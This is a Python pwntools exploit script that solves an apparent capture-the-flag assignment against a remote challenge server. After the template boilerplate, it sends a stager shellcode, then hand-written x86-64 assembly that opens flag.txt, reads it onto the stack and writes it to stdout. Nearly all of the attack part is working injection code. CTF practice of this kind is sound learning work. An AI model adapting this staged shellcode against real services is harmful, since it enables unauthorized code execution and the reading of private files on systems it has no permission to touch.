#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host cpsc233-assignment3.ctf.maplebacon.org --port 1337
from pwn import *

context.log_level = 50

# Set up pwntools for the correct architecture
exe = ELF("cpsc233_a3")
context.binary = exe
path = "./cpsc233_a3"

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "cpsc233-assignment3.ctf.maplebacon.org"
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([path] + argv, *a, **kw)


def start_remote():
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote()


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
continue
""".format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()
shellcode = asm(shellcraft.read(0, 0x233300f, 0x1000))
your_asm_code_here = """
sub rsp, 9 # open
movabs rax, 0x7478742e67616c66 # "flag.txt"
mov QWORD PTR [rsp], rax # write that to the stack
mov BYTE PTR [rsp+8], 0x0 # null termination!
mov rax, 2 # open
mov rdi, rsp # address of fp is rsp :)
mov rsi, 0
syscall
add rsp, 9 # restore the stack

mov rdi, rax # copy fd
mov r8, rdi # save fd to close later
mov rax, 0 # read
sub rsp, 0x400 # allocate space on the stack
mov rsi, rsp # buffer
mov rdx, 1024
syscall

mov rdx, rax # read returns how many bytes is read, move this into arg for write
mov rax, 1 # write
mov rdi, 1 # stdout
mov rsi, rsp # buffer
syscall

add rsp, 0x400 # restore stack
mov rdi, r8 # restore fd into rdi
mov rax, 3 # close
syscall

ret
"""
shellcode2 = asm(your_asm_code_here)
io.sendlineafter(b"here: ", shellcode.hex().encode())
io.sendline(shellcode2)
io.recvline()
print(io.recvline()[:-15].decode())
io.close()
